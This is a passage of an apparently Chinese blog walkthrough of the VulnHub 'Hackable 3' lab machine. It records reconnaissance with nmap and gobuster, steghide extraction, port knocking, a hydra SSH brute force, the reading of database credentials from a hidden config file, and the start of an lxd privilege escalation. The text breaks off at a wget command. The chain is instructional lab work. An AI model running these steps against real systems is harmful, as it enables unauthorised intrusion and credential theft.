(Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00060s latency).<br>MAC Address: 08:00:27:ED:9E:57 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00072s latency).<br>MAC Address: 08:00:27:8E:19:B2 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 1.93 seconds<br></code></pre></td></tr></table></figure><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --min-rate 10000 -p- 192.168.2.13                     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 14:20 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE    SERVICE<br>22/tcp filtered ssh<br>80/tcp open     http<br>MAC Address: 08:00:27:8E:19:B2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.00 seconds<br></code></pre></td></tr></table></figure><ul><li>发现只开放80端口，22端口处于被过滤状态<br>（2）端口细节扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p22,80 192.168.2.13 -oA nmapscan/detail<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 14:22 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00075s latency).<br><br>PORT   STATE  SERVICE VERSION<br>22/tcp closed ssh<br>80/tcp open   http    Apache httpd 2.4.46 ((Ubuntu))<br>MAC Address: 08:00:27:8E:19:B2 (Oracle VirtualBox virtual NIC)<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br><br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 18.33 seconds<br><br></code></pre></td></tr></table></figure>（3）进行漏洞扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80 192.168.2.13 -oA nmapscan/vuln <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 14:31 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00033s latency).<br><br>PORT   STATE    SERVICE<br>22/tcp filtered ssh<br>80/tcp open     http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.13</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.2.13:80/login_page/login.html</span><br><span class="hljs-string">|     Form id: ckb1</span><br><span class="hljs-string">|_    Form action: ../login.php</span><br><span class="hljs-string">| http-sql-injection: </span><br><span class="hljs-string">|   Possible sqli for queries:</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/css/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/css/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/css/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/css/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=S%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/images/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/images/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/images/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/images/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/fonts/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/fonts/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/fonts/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/fonts/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=M%3BO%3DD%27%20OR%20sqlspider</span><br><span class="hljs-string">|     http://192.168.2.13:80/login_page/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="hljs-string">|   Possible sqli for forms:</span><br><span class="hljs-string">|     Form at path: /login_page/login.html, form&#x27;</span>s action: ../login.php. Fields that might be vulnerable:<br>|       user<br>|_      remember-me<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /login.php: Possible admin folder</span><br><span class="hljs-string">|   /home.html: Possible admin folder</span><br><span class="hljs-string">|   /backup/: Backup folder w/ directory listing</span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /config/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.46 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /css/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.46 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_  /js/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.46 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">MAC Address: 08:00:27:8E:19:B2 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 32.79 seconds</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）访问80端口，只是一个图片，查看页面源码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111649036.png"></p><ul><li>找到一个注释，提示，jubiscleudo，请不要忘记在离开你的部门时激活端口敲门，并告诉老板不要忘记批准，jpg文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Please, jubiscleudo, don<span class="hljs-string">&#x27;t forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com</span><br></code></pre></td></tr></table></figure>（2）进行目录扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.13 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html<br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.13<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 1095]<br>/home.html            (Status: 200) [Size: 11327]<br>/login.php            (Status: 200) [Size: 487]<br>/css                  (Status: 301) [Size: 310] [--&gt; http://192.168.2.13/css/]<br>/js                   (Status: 301) [Size: 309] [--&gt; http://192.168.2.13/js/]<br>/config               (Status: 301) [Size: 313] [--&gt; http://192.168.2.13/config/]<br>/config.php           (Status: 200) [Size: 507]<br>/backup               (Status: 301) [Size: 313] [--&gt; http://192.168.2.13/backup/]<br>/robots.txt           (Status: 200) [Size: 33]<br>/imagens              (Status: 301) [Size: 314] [--&gt; http://192.168.2.13/imagens/]<br>/login_page           (Status: 301) [Size: 317] [--&gt; http://192.168.2.13/login_page/]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 882236 / 882240 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>（3）访问robot.txt，显示不允许访问<code>config</code>，尝试进行访问，发现是一个base64的编码<code>MTAwMDA=</code>，进行解码，解出来是<code>10000</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111727485.png"><br>（4）访问login.php，显示空白页面，查看页面源码，是一个PHP代码，里面有一个<code>3.jpg</code>，根据提示，尝试去读取图片中的信息<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111731287.png"><br>（5）使用steghide去读取图片信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> wget http://192.168.2.13/3.jpg                                      <br>--2025-02-11 15:05:32--  http://192.168.2.13/3.jpg<br>正在连接 192.168.2.13:80... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：61259 (60K) [image/jpeg]<br>正在保存至: “3.jpg”<br><br>3.jpg                         100%[==============================================&gt;]  59.82K  --.-KB/s  用时 0s      <br><br>2025-02-11 15:05:32 (819 MB/s) - 已保存 “3.jpg” [61259/61259])<br>┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ steghide info 3.jpg <br><span class="hljs-string">&quot;3.jpg&quot;</span>:<br>  format: jpeg<br>  capacity: 3.6 KB<br>Try to get information about embedded data ? (y/n) y<br>Enter passphrase: <br>  embedded file <span class="hljs-string">&quot;steganopayload148505.txt&quot;</span>:<br>    size: 12.0 Byte<br>    encrypted: rijndael-128, cbc<br>    compressed: <span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure></li><li>找到图片里面有一个txt文件，进行提取，找到一个端口号<code>65535</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> steghide extract -sf 3.jpg<br>Enter passphrase: <br>wrote extracted data to <span class="hljs-string">&quot;steganopayload148505.txt&quot;</span>.<br>┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">cat</span> steganopayload148505.txt <br>porta:65535       <br></code></pre></td></tr></table></figure>（6）访问<code>/css</code>，在里面找到一个<code>2.txt</code>，查看发现是<code>++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;------------------....</code>，结果搜索，发现是<code>Brainfuck</code>加密，进行解密得到<code>4444</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111740037.png"><br>（7）访问<code>config.php</code>，发现页面是空白的，查看页面源码，是数据库连接的配置文件<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111742396.png"><br>（8）访问<code>/backup</code>，找到里面存在一个字典<code>wordlist.txt</code>，下载到本地<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111744008.png"><br>（9）访问<code>/imagens</code>，里面存在一些图片<br>（10）访问<code>/login_page</code>，里面找到一个<code>login.html</code>，进行访问，发现是一个登录页面，尝试进行登录，直接跳转至<code>login.php</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502111747161.png"></li></ul><h1 id="敲击端口"><a href="#敲击端口" class="headerlink" title="敲击端口"></a>敲击端口</h1><p>（1）根据开始的提示和22端口处于关闭状态，需要进行敲击激活端口，收集到端口为<code>10000,4444,65535</code>，使用<code>knock</code>进行敲击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ knock -v 192.168.2.13 10000 4444 65535<br>hitting tcp 192.168.2.13:10000<br>hitting tcp 192.168.2.13:4444<br>hitting tcp 192.168.2.13:65535<br></code></pre></td></tr></table></figure><p>（2）再次进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --min-rate 10000 -p- 192.168.2.13                                   <br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 15:48 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.13<br>Host is up (0.00015s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:8E:19:B2 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 16.33 seconds<br></code></pre></td></tr></table></figure><ul><li>发现22端口已经开放</li></ul><h1 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h1><p>（1）根据收集到的信息，尝试进行ssh爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ hydra -l jubiscleudo -P wordlist.txt ssh://192.168.2.13:22 -f<br>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-11 15:49:11<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 300 login tries (l:1/p:300), ~19 tries per task<br>[DATA] attacking ssh://192.168.2.13:22/<br>[22][ssh] host: 192.168.2.13   login: jubiscleudo   password: onlymy<br>[STATUS] attack finished <span class="hljs-keyword">for</span> 192.168.2.13 (valid pair found)<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-11 15:49:54<br></code></pre></td></tr></table></figure><ul><li>最后爆破出来，用户名：<code>jubiscleudo</code>，密码：<code>onlymy</code><br>（2）进行ssh登录<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ ssh jubiscleudo@192.168.2.13<br>The authenticity of host <span class="hljs-string">&#x27;192.168.2.13 (192.168.2.13)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:eKPnFiq8KwR3xWNP5ZL/aPJYYx+GZaCVrzrHIL4rem4.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.2.13<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">jubiscleudo@192.168.2.13&#x27;</span>s password: <br>Welcome to Ubuntu 21.04 (GNU/Linux 5.11.0-16-generic x86_64)<br><br>Last login: Thu Apr 29 16:19:07 2021 from 192.168.2.106<br>jubiscleudo@ubuntu20:~$ <span class="hljs-built_in">id</span><br>uid=1001(jubiscleudo) gid=1001(jubiscleudo) <span class="hljs-built_in">groups</span>=1001(jubiscleudo)<br></code></pre></td></tr></table></figure>（3）查看home目录，发现还存在一个用户<code>hackable_3</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jubiscleudo@ubuntu20:~$ <span class="hljs-built_in">ls</span> -la /home<br>total 16<br>drwxr-xr-x  4 root        root        4096 Apr 29  2021 .<br>drwxr-xr-x 21 root        root        4096 Apr 29  2021 ..<br>drwxr-x---  4 hackable_3  hackable_3  4096 Feb 11 07:49 hackable_3<br>drwxr-x---  3 jubiscleudo jubiscleudo 4096 Apr 29  2021 jubiscleudo<br></code></pre></td></tr></table></figure>（4）查看<code>var/www/htmk</code>下面还存在一个隐藏文件，查看，找到一个用户名和密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">jubiscleudo@ubuntu20:~$ <span class="hljs-built_in">ls</span> -la /var/www/html<br>total 124<br>drwxr-xr-x 8 root     root      4096 Jun 30  2021 .<br>drwxr-xr-x 3 root     root      4096 Apr 29  2021 ..<br>-rw-r--r-- 1 www-data www-data 61259 Apr 21  2021 3.jpg<br>drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 backup<br>-r-xr-xr-x 1 www-data www-data   522 Apr 29  2021 .backup_config.php<br>drwxr-xr-x 2 www-data www-data  4096 Apr 29  2021 config<br>-rw-r--r-- 1 www-data www-data   507 Apr 23  2021 config.php<br>drwxr-xr-x 2 www-data www-data  4096 Apr 21  2021 css<br>-rw-r--r-- 1 www-data www-data 11327 Jun 30  2021 home.html<br>drwxr-xr-x 2 www-data www-data  4096 Apr 21  2021 imagens<br>-rw-r--r-- 1 www-data www-data  1095 Jun 30  2021 index.html<br>drwxr-xr-x 2 www-data www-data  4096 Apr 20  2021 js<br>drwxr-xr-x 5 www-data www-data  4096 Jun 30  2021 login_page<br>-rw-r--r-- 1 www-data www-data   487 Apr 23  2021 login.php<br>-rw-r--r-- 1 www-data www-data    33 Apr 21  2021 robots.txt<br>jubiscleudo@ubuntu20:~$ <span class="hljs-built_in">cat</span> /var/www/html/.backup_config.php <br>&lt;?php<br>/* Database credentials. Assuming you are running MySQL<br>server with default setting (user <span class="hljs-string">&#x27;root&#x27;</span> with no password) */<br>define(<span class="hljs-string">&#x27;DB_SERVER&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_USERNAME&#x27;</span>, <span class="hljs-string">&#x27;hackable_3&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;TrOLLED_3&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_NAME&#x27;</span>, <span class="hljs-string">&#x27;hackable&#x27;</span>);<br> <br>/* Attempt to connect to MySQL database */<br><span class="hljs-variable">$conexao</span> = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);<br><br><br>// Check connection<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$conexao</span> === <span class="hljs-literal">false</span>)&#123;<br>    die(<span class="hljs-string">&quot;ERROR: Could not connect. &quot;</span> . mysqli_connect_error());<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>&#125;<br>?&gt;<br>jubiscleudo@ubuntu20:~$ <br></code></pre></td></tr></table></figure>（5）切换用户，成功进入<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">jubiscleudo@ubuntu20:~$ su hackable_3<br>Password: <br>hackable_3@ubuntu20:/home/jubiscleudo$ <span class="hljs-built_in">id</span><br>uid=1000(hackable_3) gid=1000(hackable_3) <span class="hljs-built_in">groups</span>=1000(hackable_3),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)<br></code></pre></td></tr></table></figure></li></ul><h1 id="提权-lxd"><a href="#提权-lxd" class="headerlink" title="提权-lxd"></a>提权-lxd</h1><p>（1）查看<code>hackable_3</code>用户的id时，发现存在一个用户组&#96;lxd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/home/jubiscleudo$ <span class="hljs-built_in">id</span><br>uid=1000(hackable_3) gid=1000(hackable_3) <span class="hljs-built_in">groups</span>=1000(hackable_3),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)<br></code></pre></td></tr></table></figure><p>（2）验证是否具备提权条件，必修要存在这两个文件才可以进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/home/jubiscleudo$ <span class="hljs-built_in">which</span> lxd &amp;&amp; <span class="hljs-built_in">which</span> lxc<br>/snap/bin/lxd<br>/snap/bin/lxc<br></code></pre></td></tr></table></figure><ul><li>发现存在这两个文件，说明可以进行提权<br>（3）上传构造好的alpine镜像，并开启web服务<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m http.server 80<br></code></pre></td></tr></table></figure>（4）下载alpine镜像<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/tmp$ wget 